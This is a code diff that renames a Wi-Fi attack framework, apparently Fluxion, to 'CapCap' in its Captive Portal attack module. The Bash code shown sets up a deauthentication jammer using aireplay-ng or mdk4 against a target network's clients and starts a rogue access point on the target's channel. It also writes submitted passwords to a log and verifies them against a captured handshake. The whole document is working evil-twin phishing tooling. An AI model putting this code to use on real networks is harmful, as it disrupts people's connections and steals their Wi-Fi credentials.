@@ -5,13 +5,13 @@
 # ============================================================ #
 CaptivePortalState="Not Ready"
 
-CaptivePortalPassLog="$FLUXIONPath/attacks/Captive Portal/pwdlog"
-CaptivePortalNetLog="$FLUXIONPath/attacks/Captive Portal/netlog"
+CaptivePortalPassLog="$CAPCAPPath/attacks/Captive Portal/pwdlog"
+CaptivePortalNetLog="$CAPCAPPath/attacks/Captive Portal/netlog"
 
 # kea-dhcp4's memfile lease backend refuses any lease-database path outside
 # /var/lib/kea (hardcoded restriction, also the only path the distro's
 # kea-dhcp4 AppArmor profile grants write access to), so the lease file
-# can't live under FLUXIONWorkspacePath like the rest of the attack's state.
+# can't live under CAPCAPWorkspacePath like the rest of the attack's state.
 CaptivePortalKeaLeases="/var/lib/kea/kea-leases4.csv"
 
 # ============= < Virtual Network Configuration > ============ #
@@ -32,8 +32,8 @@ captive_portal_unset_jammer_interface() {
     return 1
   fi
 
-  # Deallocate the interface from FluxionInterfaces so it can be reused.
-  fluxion_deallocate_interface "$CaptivePortalJammerInterface" 2>/dev/null
+  # Deallocate the interface from CapCapInterfaces so it can be reused.
+  capcap_deallocate_interface "$CaptivePortalJammerInterface" 2>/dev/null
 
   CaptivePortalJammerInterface=""
   CaptivePortalJammerInterfaceOriginal=""
@@ -50,30 +50,30 @@ captive_portal_set_jammer_interface() {
   if [ "$CaptivePortalJammerInterface" ]; then return 0; fi
 
   if [ ! "$CaptivePortalJammerInterfaceOriginal" ]; then
-    echo "Running get jammer interface." >> $FLUXIONOutputDevice
-    if [ "$FLUXIONJammerInterface" ]; then
-      FluxionInterfaceSelected="$FLUXIONJammerInterface"
-    elif ! fluxion_get_interface attack_targetting_interfaces \
+    echo "Running get jammer interface." >> $CAPCAPOutputDevice
+    if [ "$CAPCAPJammerInterface" ]; then
+      CapCapInterfaceSelected="$CAPCAPJammerInterface"
+    elif ! capcap_get_interface attack_targetting_interfaces \
       "$CaptivePortalJammerInterfaceQuery"; then
-      echo "Failed to get jammer interface" >> $FLUXIONOutputDevice
+      echo "Failed to get jammer interface" >> $CAPCAPOutputDevice
       return 1
     fi
-    CaptivePortalJammerInterfaceOriginal=$FluxionInterfaceSelected
+    CaptivePortalJammerInterfaceOriginal=$CapCapInterfaceSelected
   fi
 
   local selectedInterface=$CaptivePortalJammerInterfaceOriginal
 
-  if ! fluxion_allocate_interface $selectedInterface; then
-    echo "Failed to allocate jammer interface" >> $FLUXIONOutputDevice
+  if ! capcap_allocate_interface $selectedInterface; then
+    echo "Failed to allocate jammer interface" >> $CAPCAPOutputDevice
     return 2
   fi
 
-  echo "Succeeded get jammer interface." >> $FLUXIONOutputDevice
+  echo "Succeeded get jammer interface." >> $CAPCAPOutputDevice
   # Get the actual interface to use (renamed or original)
   if interface_is_real "$selectedInterface"; then
     CaptivePortalJammerInterface="$selectedInterface"
   else
-    CaptivePortalJammerInterface=${FluxionInterfaces[$selectedInterface]}
+    CaptivePortalJammerInterface=${CapCapInterfaces[$selectedInterface]}
   fi
 }
 
@@ -95,13 +95,13 @@ captive_portal_unset_ap_interface() {
   if [[ "$CaptivePortalAccessPointInterface" == *v ]]; then
     if [ -n "$CaptivePortalAccessPointInterface" ] && interface_physical "$CaptivePortalAccessPointInterface"; then
       if ! iw dev "$CaptivePortalAccessPointInterface" del \
-        &>> $FLUXIONOutputDevice; then
-        echo "Warning: Unable to remove virtual interface $CaptivePortalAccessPointInterface" >> $FLUXIONOutputDevice
+        &>> $CAPCAPOutputDevice; then
+        echo "Warning: Unable to remove virtual interface $CaptivePortalAccessPointInterface" >> $CAPCAPOutputDevice
       fi
     fi
   else
-    # Non-virtual: deallocate the interface from FluxionInterfaces so it can be reused.
-    fluxion_deallocate_interface "$CaptivePortalAccessPointInterface" 2>/dev/null
+    # Non-virtual: deallocate the interface from CapCapInterfaces so it can be reused.
+    capcap_deallocate_interface "$CaptivePortalAccessPointInterface" 2>/dev/null
   fi
 
   CaptivePortalAccessPointInterface=""
@@ -112,39 +112,39 @@ captive_portal_set_ap_interface() {
   if [ "$CaptivePortalAccessPointInterface" ]; then return 0; fi
 
   if [ ! "$CaptivePortalAccessPointInterfaceOriginal" ]; then
-    echo "Running get ap interface." >> $FLUXIONOutputDevice
-    if [ "$FLUXIONAPInterface" ]; then
-      FluxionInterfaceSelected="$FLUXIONAPInterface"
-    elif ! fluxion_get_interface captive_portal_ap_interfaces \
+    echo "Running get ap interface." >> $CAPCAPOutputDevice
+    if [ "$CAPCAPAPInterface" ]; then
+      CapCapInterfaceSelected="$CAPCAPAPInterface"
+    elif ! capcap_get_interface captive_portal_ap_interfaces \
       "$CaptivePortalAccessPointInterfaceQuery"; then
-      echo "Failed to get ap interface" >> $FLUXIONOutputDevice
+      echo "Failed to get ap interface" >> $CAPCAPOutputDevice
       return 1
     fi
-    CaptivePortalAccessPointInterfaceOriginal=$FluxionInterfaceSelected
+    CaptivePortalAccessPointInterfaceOriginal=$CapCapInterfaceSelected
   fi
 
   local selectedInterface=$CaptivePortalAccessPointInterfaceOriginal
 
-  if ! fluxion_allocate_interface $selectedInterface; then
-    echo "Failed to allocate ap interface" >> $FLUXIONOutputDevice
+  if ! capcap_allocate_interface $selectedInterface; then
+    echo "Failed to allocate ap interface" >> $CAPCAPOutputDevice
     return 2
   fi
 
-  echo "Succeeded get ap interface." >> $FLUXIONOutputDevice
+  echo "Succeeded get ap interface." >> $CAPCAPOutputDevice
   # Get the actual interface to use (renamed or original)
   if interface_is_real "$selectedInterface"; then
     CaptivePortalAccessPointInterface="$selectedInterface"
   else
-    CaptivePortalAccessPointInterface=${FluxionInterfaces[$selectedInterface]}
+    CaptivePortalAccessPointInterface=${CapCapInterfaces[$selectedInterface]}
   fi
 
   # If interfaces are the same, we need an independent virtual interface.
   if [ "$CaptivePortalAccessPointInterface" = \
     "$CaptivePortalJammerInterface" ]; then
-    # TODO: Make fluxion's interface services manage virtual interfaces.
-    # Have fluxion_get_interface return a virutal interface if the primary
+    # TODO: Make capcap's interface services manage virtual interfaces.
+    # Have capcap_get_interface return a virutal interface if the primary
     # interface is in used by something else (virtual reservation?).
-    echo "Virtual interface required, attempting." >> $FLUXIONOutputDevice
+    echo "Virtual interface required, attempting." >> $CAPCAPOutputDevice
     # Use the renamed interface (the key that maps to original), not the original
     local physicalInterface="$selectedInterface"
     if ! interface_is_real "$selectedInterface"; then
@@ -153,12 +153,12 @@ captive_portal_set_ap_interface() {
     fi
     if ! iw dev "$physicalInterface" interface \
       add "${physicalInterface}v" type managed \
-      2>> $FLUXIONOutputDevice; then
-      echo -e "$FLUXIONVLine $CaptivePortalCannotStartInterfaceError"
+      2>> $CAPCAPOutputDevice; then
+      echo -e "$CAPCAPVLine $CaptivePortalCannotStartInterfaceError"
       sleep 5
       return 2
     fi
-    echo "Virtual interface created successfully." >> $FLUXIONOutputDevice
+    echo "Virtual interface created successfully." >> $CAPCAPOutputDevice
 
     # Keep NetworkManager off the freshly created virtual interface. The
     # virtual AP interface shares a single radio (phy) with the jammer's
@@ -168,9 +168,9 @@ captive_portal_set_ap_interface() {
     # until the AP service brings it up on its own channel.
     if [ -x "$(command -v nmcli)" ]; then
       nmcli device set "${physicalInterface}v" managed no \
-        &>> $FLUXIONOutputDevice
+        &>> $CAPCAPOutputDevice
     fi
-    ip link set "${physicalInterface}v" down &>> $FLUXIONOutputDevice
+    ip link set "${physicalInterface}v" down &>> $CAPCAPOutputDevice
 
     CaptivePortalAccessPointInterface=${physicalInterface}v
   fi
@@ -203,7 +203,7 @@ captive_portal_unset_ap_channel() {
   CaptivePortalAccessPointChannel=""
 
   # Since we auto-select when on auto, trigger the undo-chain.
-  if [ "$FLUXIONAuto" ]; then return 2; fi
+  if [ "$CAPCAPAuto" ]; then return 2; fi
 }
 
 # Lets the operator run the rogue access point on a different channel (and
@@ -216,8 +216,8 @@ captive_portal_set_ap_channel() {
   captive_portal_unset_ap_channel
 
   # Auto mode: honor --ap-channel, otherwise mirror the target's channel.
-  if [ "$FLUXIONAuto" ]; then
-    local autoChannel="${FLUXIONAPChannel:-$FluxionTargetChannel}"
+  if [ "$CAPCAPAuto" ]; then
+    local autoChannel="${CAPCAPAPChannel:-$CapCapTargetChannel}"
 
     # Validate against the AP interface's bands so auto mode fails loudly here
     # (e.g. a 2.4GHz-only card asked to host a 5GHz channel) instead of dying
@@ -225,7 +225,7 @@ captive_portal_set_ap_channel() {
     interface_bands "$CaptivePortalAccessPointInterface" 2>/dev/null
     local autoBands="${InterfaceBands:-unknown}"
     if ! captive_portal_channel_supported "$autoChannel" "$autoBands"; then
-      fluxion_conditional_bail "$CaptivePortalAPChannelUnsupportedAutoError"
+      capcap_conditional_bail "$CaptivePortalAPChannelUnsupportedAutoError"
       return 2
     fi
 
@@ -240,24 +240,24 @@ captive_portal_set_ap_channel() {
   # returns here instead of aborting the whole step.
   local channelNotice=""
   while true; do
-    fluxion_header
+    capcap_header
 
-    echo -e "$FLUXIONVLine $CaptivePortalAPChannelQuery"
+    echo -e "$CAPCAPVLine $CaptivePortalAPChannelQuery"
     echo
 
-    fluxion_target_show
+    capcap_target_show
 
     # A guard (e.g. target band unsupported by the AP interface) leaves a
     # notice here that persists across the screen redraw until resolved.
     if [ "$channelNotice" ]; then
-      echo -e "$FLUXIONVLine $channelNotice"
+      echo -e "$CAPCAPVLine $channelNotice"
       echo
     fi
 
     local choices=(
       "$CaptivePortalAPChannelTargetOption"
       "$CaptivePortalAPChannelCustomOption"
-      "$FLUXIONGeneralBackOption"
+      "$CAPCAPGeneralBackOption"
     )
 
     io_query_choice "" choices[@]
@@ -269,12 +269,12 @@ captive_portal_set_ap_channel() {
         # The AP interface may not support the target's band (e.g. a 2.4GHz-only
         # card against a 5GHz target). Catch it here instead of failing later at
         # hostapd, and steer the user to a custom channel on a supported band.
-        if ! captive_portal_channel_supported "$FluxionTargetChannel" "$apBands"; then
+        if ! captive_portal_channel_supported "$CapCapTargetChannel" "$apBands"; then
           channelNotice="$CaptivePortalAPChannelUnsupportedWarning"
           continue
         fi
         channelNotice=""
-        CaptivePortalAccessPointChannel="$FluxionTargetChannel"
+        CaptivePortalAccessPointChannel="$CapCapTargetChannel"
         break
         ;;
       "$CaptivePortalAPChannelCustomOption")
@@ -284,27 +284,27 @@ captive_portal_set_ap_channel() {
         while [ ! "$customChannel" ]; do
           # Redraw a clean screen on every attempt so this prompt matches the
           # rest of the interface (header + target block + input examples).
-          fluxion_header
+          capcap_header
 
-          echo -e "$FLUXIONVLine $CaptivePortalAPChannelQuery"
+          echo -e "$CAPCAPVLine $CaptivePortalAPChannelQuery"
           echo
 
-          fluxion_target_show
+          capcap_target_show
 
-          echo -e "$FLUXIONVLine $CaptivePortalAPChannelCustomNotice"
+          echo -e "$CAPCAPVLine $CaptivePortalAPChannelCustomNotice"
           echo
           echo -e "     $CaptivePortalAPChannelExampleTip ${CBlu}6$CClr, ${CBlu}11$CClr (2.4GHz)"
           echo -e "     $CaptivePortalAPChannelExampleTip ${CBlu}36$CClr, ${CBlu}149$CClr (5GHz)"
           echo -e "     $CaptivePortalAPChannelBandsTip $CClr$apBands"
-          echo -e "${CSRed}[${CSYel}0${CSRed}]${CClr} $FLUXIONGeneralBackOption"
+          echo -e "${CSRed}[${CSYel}0${CSRed}]${CClr} $CAPCAPGeneralBackOption"
           echo
 
           if [ "$channelError" ]; then
-            echo -e "$FLUXIONVLine $CaptivePortalAPChannelInvalidError"
+            echo -e "$CAPCAPVLine $CaptivePortalAPChannelInvalidError"
             echo
           fi
 
-          echo -ne "$FLUXIONPrompt"
+          echo -ne "$CAPCAPPrompt"
           read customChannel
 
           # 0 returns to the channel-option menu above.
@@ -328,7 +328,7 @@ captive_portal_set_ap_channel() {
         CaptivePortalAccessPointChannel="$customChannel"
         break
         ;;
-      "$FLUXIONGeneralBackOption")
+      "$CAPCAPGeneralBackOption")
         captive_portal_unset_ap_channel
         return -1
         ;;
@@ -341,7 +341,7 @@ captive_portal_set_ap_channel() {
 
   # Warn when the chosen band differs from the target's while the jammer and
   # access point share a single radio, which cannot cover both at once.
-  local targetChannel=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
+  local targetChannel=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
   local apChannel=$(echo "$CaptivePortalAccessPointChannel" | grep -oE '[0-9]+' | head -1)
   local targetIs5=0 apIs5=0
   [ "$targetChannel" -gt 14 ] 2>/dev/null && targetIs5=1
@@ -352,7 +352,7 @@ captive_portal_set_ap_channel() {
     interface_physical "$CaptivePortalJammerInterface"
     local jammerPhysical="$InterfacePhysical"
     if [ "$apPhysical" ] && [ "$apPhysical" = "$jammerPhysical" ]; then
-      echo -e "$FLUXIONVLine $CaptivePortalAPChannelSharedRadioWarning"
+      echo -e "$CAPCAPVLine $CaptivePortalAPChannelSharedRadioWarning"
       sleep 5
     fi
   fi
@@ -365,7 +365,7 @@ function captive_portal_unset_deauth_method() {
   option_deauth=""
 
   # Since we're auto-selecting when on auto, trigger undo-chain.
-  if [ "$FLUXIONAuto" ]; then return 2; fi
+  if [ "$CAPCAPAuto" ]; then return 2; fi
 }
 
 function captive_portal_set_deauth_method() {
@@ -385,7 +385,7 @@ function captive_portal_set_deauth_method() {
   # a screen, and removes the chance of an empty answer leaving the attack
   # running with no deauthentication at all.
   local methodName="aireplay-ng"
-  case "${FLUXIONDeauthMethod:-}" in
+  case "${CAPCAPDeauthMethod:-}" in
     mdk4)
       option_deauth=1
       methodName="mdk4"
@@ -395,19 +395,19 @@ function captive_portal_set_deauth_method() {
       ;;
     *)
       # shellcheck disable=SC2059
-      echo -e "$FLUXIONVLine $(printf "${FLUXIONDeauthMethodUnknown:-Unknown --deauth-method '%s', using aireplay-ng.}" \
-        "$FLUXIONDeauthMethod")" >&2
+      echo -e "$CAPCAPVLine $(printf "${CAPCAPDeauthMethodUnknown:-Unknown --deauth-method '%s', using aireplay-ng.}" \
+        "$CAPCAPDeauthMethod")" >&2
       option_deauth=2
       ;;
   esac
 
   echo
   # shellcheck disable=SC2059
-  echo -e "$FLUXIONVLine $(printf "${FLUXIONDeauthMethodUsing:-Deauthentication method: %s}" "$methodName")"
+  echo -e "$CAPCAPVLine $(printf "${CAPCAPDeauthMethodUsing:-Deauthentication method: %s}" "$methodName")"
   local otherMethod="aireplay-ng"
   [ "$option_deauth" = 2 ] && otherMethod="mdk4"
   # shellcheck disable=SC2059
-  echo -e "$FLUXIONVLine ${CClr}$(printf "${FLUXIONDeauthMethodOverrideTip:-Want the other one? Start with --deauth-method %s.}" \
+  echo -e "$CAPCAPVLine ${CClr}$(printf "${CAPCAPDeauthMethodOverrideTip:-Want the other one? Start with --deauth-method %s.}" \
     "$otherMethod")${CClr}"
 
   CaptivePortalJammerType="$option_deauth"
@@ -417,7 +417,7 @@ function captive_portal_unset_deauth_target() {
   # Drop the cached client-scan result so the next time we land on the
   # deauth-target step (e.g. after going back and re-picking an interface)
   # the station scan runs again instead of reusing stale results.
-  FluxionTargetClientsScanned=""
+  CapCapTargetClientsScanned=""
 
   if [ ! "$CaptivePortalTargetClients" ]; then return 1; fi
   CaptivePortalTargetClients=""
@@ -428,15 +428,15 @@ function captive_portal_set_deauth_target() {
 
   captive_portal_unset_deauth_target
 
-  if [ "$FLUXIONAuto" ] || ! interface_is_wireless "$CaptivePortalJammerInterface"; then
+  if [ "$CAPCAPAuto" ] || ! interface_is_wireless "$CaptivePortalJammerInterface"; then
     CaptivePortalTargetClients="broadcast"
     return 0
   fi
 
-  if [ "$FluxionTargetClientsScanned" != "${FluxionTargetMAC^^}:$FluxionTargetChannel" ]; then
-    echo -e "$FLUXIONVLine $FLUXIONStartingScannerNotice"
-    fluxion_target_scan_clients \
-      "$CaptivePortalJammerInterface" "$FluxionTargetMAC" "$FluxionTargetChannel"
+  if [ "$CapCapTargetClientsScanned" != "${CapCapTargetMAC^^}:$CapCapTargetChannel" ]; then
+    echo -e "$CAPCAPVLine $CAPCAPStartingScannerNotice"
+    capcap_target_scan_clients \
+      "$CaptivePortalJammerInterface" "$CapCapTargetMAC" "$CapCapTargetChannel"
   fi
 
   local broadcastCapable=0
@@ -445,7 +445,7 @@ function captive_portal_set_deauth_target() {
   fi
 
   local selectedClients
-  if ! fluxion_target_select_clients selectedClients "$broadcastCapable"; then
+  if ! capcap_target_select_clients selectedClients "$broadcastCapable"; then
     return 1
   fi
   CaptivePortalTargetClients="${selectedClients:-broadcast}"
@@ -457,7 +457,7 @@ function captive_portal_unset_ap_service() {
   CaptivePortalAPService=""
 
   # Since we're auto-selecting when on auto, trigger undo-chain.
-  if [ "$FLUXIONAuto" ]; then return 2; fi
+  if [ "$CAPCAPAuto" ]; then return 2; fi
 
   if ! interface_is_wireless "$CaptivePortalAccessPointInterface"; then
     return 3;
@@ -468,7 +468,7 @@ function captive_portal_set_ap_service() {
   if [ "$CaptivePortalAPService" ]; then
     if ! type -t ap_service_start &> /dev/null; then
       # AP Service: Load the service's helper routines.
-      source "$FLUXIONLibPath/ap/$CaptivePortalAPService.sh"
+      source "$CAPCAPLibPath/ap/$CaptivePortalAPService.sh"
     fi
     return 0
   fi
@@ -478,11 +478,11 @@ function captive_portal_set_ap_service() {
 
   captive_portal_unset_ap_service
 
-  local -r CaptivePortalAPChannelEffective="${CaptivePortalAccessPointChannel:-$FluxionTargetChannel}"
+  local -r CaptivePortalAPChannelEffective="${CaptivePortalAccessPointChannel:-$CapCapTargetChannel}"
 
-  if [ "$FLUXIONAuto" ]; then
-    if [ "$FLUXIONAPService" ]; then
-      CaptivePortalAPService="$FLUXIONAPService"
+  if [ "$CAPCAPAuto" ]; then
+    if [ "$CAPCAPAPService" ]; then
+      CaptivePortalAPService="$CAPCAPAPService"
     # DFS channels (52-64, 100-144) require airbase-ng since hostapd
     # needs driver CAC/radar support which USB adapters lack. The check
     # uses the rogue AP's channel, which may differ from the target's.
@@ -493,18 +493,18 @@ function captive_portal_set_ap_service() {
       CaptivePortalAPService="hostapd"
     fi
   else
-    fluxion_header
+    capcap_header
 
-    echo -e "$FLUXIONVLine $CaptivePortalAPServiceQuery"
+    echo -e "$CAPCAPVLine $CaptivePortalAPServiceQuery"
     echo
 
 
-    fluxion_target_show
+    capcap_target_show
 
     local choices=(
       "$CaptivePortalAPServiceHostapdOption"
       "$CaptivePortalAPServiceAirbaseOption"
-      "$FLUXIONGeneralBackOption"
+      "$CAPCAPGeneralBackOption"
     )
     io_query_choice "" choices[@]
 
@@ -515,18 +515,18 @@ function captive_portal_set_ap_service() {
         CaptivePortalAPService="hostapd" ;;
       "$CaptivePortalAPServiceAirbaseOption")
         CaptivePortalAPService="airbase-ng" ;;
-      "$FLUXIONGeneralBackOption")
+      "$CAPCAPGeneralBackOption")
         return 1
         ;;
     *)
-      fluxion_conditional_bail "Invalid AP service selected!"
+      capcap_conditional_bail "Invalid AP service selected!"
       return 1
       ;;
     esac
   fi
 
   # AP Service: Load the service's helper routines.
-  source "$FLUXIONLibPath/ap/$CaptivePortalAPService.sh"
+  source "$CAPCAPLibPath/ap/$CaptivePortalAPService.sh"
 }
 
 captive_portal_unset_authenticator() {
@@ -534,7 +534,7 @@ captive_portal_unset_authenticator() {
 
   case "$CaptivePortalAuthenticatorMode" in
     "hash"*)
-      echo "Unset hash is done automatically." >> $FLUXIONOutputDevice ;;
+      echo "Unset hash is done automatically." >> $CAPCAPOutputDevice ;;
   esac
 
   CaptivePortalAuthenticatorMode=""
@@ -548,7 +548,7 @@ captive_portal_set_authenticator() {
       "hash"*)
         if [ "$CaptivePortalHashPath" ]; then
           echo "Captive Portal authentication mode is already set, skipping!" \
-            >> $FLUXIONOutputDevice
+            >> $CAPCAPOutputDevice
           return 0
         fi
         ;;
@@ -562,24 +562,24 @@ captive_portal_set_authenticator() {
   # would add two prompts (the method, then a path to a .cap that usually does
   # not exist yet) and change nothing the visitor sees, so those portals skip
   # the whole step.
-  local -r __portalDir="$FLUXIONPath/attacks/Captive Portal/sites/$CaptivePortalUserInterface.portal"
+  local -r __portalDir="$CAPCAPPath/attacks/Captive Portal/sites/$CaptivePortalUserInterface.portal"
   if [ -f "$__portalDir/submit.php" ]; then
     CaptivePortalAuthenticatorMode="$CaptivePortalVerificationMethodNoneOption"
     echo
-    echo -e "$FLUXIONVLine ${CaptivePortalVerificationMethodNoneNotice}"
+    echo -e "$CAPCAPVLine ${CaptivePortalVerificationMethodNoneNotice}"
     sleep 1
     return 0
   fi
 
-  if [ "$FLUXIONAuto" ]; then
+  if [ "$CAPCAPAuto" ]; then
     CaptivePortalAuthenticatorMode="$CaptivePortalVerificationMethodCowpattyOption"
   else
-    fluxion_header
+    capcap_header
 
-    echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
+    echo -e "$CAPCAPVLine $CaptivePortalVerificationMethodQuery"
     echo
 
-    fluxion_target_show
+    capcap_target_show
 
     local choices=(
       "$CaptivePortalVerificationMethodCowpattyOption"
@@ -592,7 +592,7 @@ captive_portal_set_authenticator() {
     fi
 
     # Add back option.
-    choices+=("$FLUXIONGeneralBackOption")
+    choices+=("$CAPCAPGeneralBackOption")
 
     io_query_choice "" choices[@]
 
@@ -604,7 +604,7 @@ captive_portal_set_authenticator() {
   # If we're going back, reset everything and abort.
   if [[ \
     "$CaptivePortalAuthenticatorMode" == \
-    "$FLUXIONGeneralBackOption" ]]; then
+    "$CAPCAPGeneralBackOption" ]]; then
     captive_portal_unset_authenticator
     return -1
   fi
@@ -616,11 +616,11 @@ captive_portal_set_authenticator() {
     "hash"*)
       # Pass default path if no path is set yet.
       if [ ! "$CaptivePortalHashPath" ]; then
-        CaptivePortalHashPath="$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"
+        CaptivePortalHashPath="$CAPCAPPath/attacks/Handshake Snooper/handshakes/$CapCapTargetSSIDClean-$CapCapTargetMAC.cap"
       fi
 
-      fluxion_hash_get_path \
-        "$CaptivePortalHashPath" "$FluxionTargetMAC" "$FluxionTargetSSID"
+      capcap_hash_get_path \
+        "$CaptivePortalHashPath" "$CapCapTargetMAC" "$CapCapTargetSSID"
       result=$?
 
       # Only cache the path once it actually resolved to a real file. On
@@ -628,8 +628,8 @@ captive_portal_set_authenticator() {
       # makes the next attempt (e.g. after switching verification method) skip
       # the default-path derivation and the "use found hash" offer, dropping
       # the user straight into the manual path prompt.
-      if [ $result -eq 0 ] && [ -f "$FluxionHashPath" ] && [ -s "$FluxionHashPath" ]; then
-        CaptivePortalHashPath="$FluxionHashPath"
+      if [ $result -eq 0 ] && [ -f "$CapCapHashPath" ] && [ -s "$CapCapHashPath" ]; then
+        CaptivePortalHashPath="$CapCapHashPath"
       else
         CaptivePortalHashPath=""
       fi
@@ -640,24 +640,24 @@ captive_portal_set_authenticator() {
       fi
 
       if [ $result -ne 0 ]; then
-        echo "Failed to set a hash path!" >> $FLUXIONOutputDevice
+        echo "Failed to set a hash path!" >> $CAPCAPOutputDevice
       fi
       ;;
   esac
 
   # Assure authentication method processing succeeded, abort otherwise.
   if [ $result -ne 0 ]; then
-    echo "Auth-mode error code $result!" >> $FLUXIONOutputDevice
+    echo "Auth-mode error code $result!" >> $CAPCAPOutputDevice
     return 1
   fi
 }
 
 captive_portal_run_certificate_generator() {
-  fluxion_window_open "" \
+  capcap_window_open "" \
     "Generating Self-Signed SSL Certificate" "" "#000000" "#CCCCCC" \
-    "openssl req -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout \"$FLUXIONWorkspacePath/server.pem\" -out \"$FLUXIONWorkspacePath/server.pem\""
+    "openssl req -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout \"$CAPCAPWorkspacePath/server.pem\" -out \"$CAPCAPWorkspacePath/server.pem\""
     # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
-  chmod 400 "$FLUXIONWorkspacePath/server.pem"
+  chmod 400 "$CAPCAPWorkspacePath/server.pem"
 }
 
 captive_portal_unset_certificate() {
@@ -665,11 +665,11 @@ captive_portal_unset_certificate() {
   # WARNING: The server configuration depends on whether the certificate
   # file exists and is positioned in the proper location. The check above
   # could unsynchronize with the certificate file if we're not careful!
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/server.pem"
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/server.pem"
   CaptivePortalSSL=""
 
   # Since we're auto-selecting when on auto, trigger undo-chain.
-  if [ "$FLUXIONAuto" ]; then return 2; fi
+  if [ "$CAPCAPAuto" ]; then return 2; fi
 }
 
 # Create Self-Signed SSL Certificate
@@ -677,9 +677,9 @@ captive_portal_set_certificate() {
   if [ \
       "$CaptivePortalSSL" = "disabled" -o \
       "$CaptivePortalSSL" = "enabled" -a \
-      -f "$FLUXIONWorkspacePath/server.pem" ]; then
+      -f "$CAPCAPWorkspacePath/server.pem" ]; then
     echo "Captive Portal SSL mode already set to $CaptivePortalSSL!" \
-      >> $FLUXIONOutputDevice
+      >> $CAPCAPOutputDevice
     return 0
   fi
 
@@ -690,19 +690,19 @@ captive_portal_set_certificate() {
 
   captive_portal_unset_certificate
 
-  # Check existance of ssl certificate within fluxion with file size > 0
-  # If user-supplied (fancy) certificate exists, copy it to fluxspace.
+  # Check existance of ssl certificate within capcap with file size > 0
+  # If user-supplied (fancy) certificate exists, copy it to capcapspace.
   if [ \
-    -f "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" -a \
-    -s "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
+    -f "$CAPCAPPath/attacks/Captive Portal/certificate/server.pem" -a \
+    -s "$CAPCAPPath/attacks/Captive Portal/certificate/server.pem" \
     ]; then
-    cp "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
-      "$FLUXIONWorkspacePath/server.pem"
+    cp "$CAPCAPPath/attacks/Captive Portal/certificate/server.pem" \
+      "$CAPCAPWorkspacePath/server.pem"
 
     CaptivePortalSSL="enabled" # Enabled if sourcing user certificate
 
     echo "Captive Portal certificate was user supplied, skipping query!" \
-      >> $FLUXIONOutputDevice
+      >> $CAPCAPOutputDevice
     return 0
   fi
 
@@ -710,7 +710,7 @@ captive_portal_set_certificate() {
   # Check if we're restoring and we need to re-create certificate.
   if [ "$restoring" ]; then
     if ! captive_portal_run_certificate_generator; then
-      fluxion_conditional_bail "cert-gen failed!"
+      capcap_conditional_bail "cert-gen failed!"
       return 2
     fi
     CaptivePortalSSL="enabled"
@@ -718,14 +718,14 @@ captive_portal_set_certificate() {
   fi
 
 
-  if [ "$FLUXIONAuto" ]; then
+  if [ "$CAPCAPAuto" ]; then
     CaptivePortalSSL="disabled"
   else
     local choices=(
       "$CaptivePortalCertificateSourceGenerateOption"
       "$CaptivePortalCertificateSourceRescanOption"
       "$CaptivePortalCertificateSourceDisabledOption"
-      "$FLUXIONGeneralBackOption"
+      "$CAPCAPGeneralBackOption"
     )
 
     io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]
@@ -736,7 +736,7 @@ captive_portal_set_certificate() {
       "$CaptivePortalCertificateSourceGenerateOption")
         # If cert generator fails, gtfo, something broke!
         if ! captive_portal_run_certificate_generator; then
-          fluxion_conditional_bail "cert-gen failed!"
+          capcap_conditional_bail "cert-gen failed!"
           return 2
         fi
         CaptivePortalSSL="enabled"
@@ -751,11 +751,11 @@ captive_portal_set_certificate() {
         CaptivePortalSSL="disabled"
         ;;
 
-      "$FLUXIONGeneralBackOption")
+      "$CAPCAPGeneralBackOption")
         return 1
         ;;
       *)
-        fluxion_conditional_bail "Unknown cert-gen option!"
+        capcap_conditional_bail "Unknown cert-gen option!"
         return 2
         ;;
     esac
@@ -767,7 +767,7 @@ captive_portal_unset_connectivity() {
   CaptivePortalConnectivity=""
 
   # Since we're auto-selecting when on auto, trigger undo-chain.
-  if [ "$FLUXIONAuto" ]; then return 2; fi
+  if [ "$CAPCAPAuto" ]; then return 2; fi
 }
 
 captive_portal_set_connectivity() {
@@ -775,13 +775,13 @@ captive_portal_set_connectivity() {
 
   captive_portal_unset_connectivity
 
-  if [ "$FLUXIONAuto" ]; then
+  if [ "$CAPCAPAuto" ]; then
     CaptivePortalConnectivity="disconnected"
   else
     local choices=(
       "$CaptivePortalConnectivityDisconnectedOption"
       "$CaptivePortalConnectivityEmulatedOption"
-      "$FLUXIONGeneralBackOption"
+      "$CAPCAPGeneralBackOption"
     )
     io_query_choice "$CaptivePortalConnectivityQuery" choices[@]
 
@@ -790,11 +790,11 @@ captive_portal_set_connectivity() {
         CaptivePortalConnectivity="disconnected" ;;
       "$CaptivePortalConnectivityEmulatedOption")
         CaptivePortalConnectivity="emulated" ;;
-      "$FLUXIONGeneralBackOption")
+      "$CAPCAPGeneralBackOption")
         return 1
         ;;
       *)
-        fluxion_conditional_bail "Unknown connectivity option!"
+        capcap_conditional_bail "Unknown connectivity option!"
         return 2
         ;;
     esac
@@ -807,7 +807,7 @@ captive_portal_unset_user_interface() {
 }
 
 captive_portal_set_user_interface() {
-  local -r attackPath="$FLUXIONPath/attacks/Captive Portal"
+  local -r attackPath="$CAPCAPPath/attacks/Captive Portal"
 
   # Skip setting UI if one is selected and is a custom or a generic portal.
   if [ "$CaptivePortalUserInterface" != "" ] && [ \
@@ -818,7 +818,7 @@ captive_portal_set_user_interface() {
 
   captive_portal_unset_user_interface
 
-  if [ "$FLUXIONAuto" ]; then
+  if [ "$CAPCAPAuto" ]; then
     # Auto mode: use generic English portal.
     if [ -f "$attackPath/generic/languages/English.lang" ]; then
       CaptivePortalUserInterface="English"
@@ -830,35 +830,35 @@ captive_portal_set_user_interface() {
   local sites=()
 
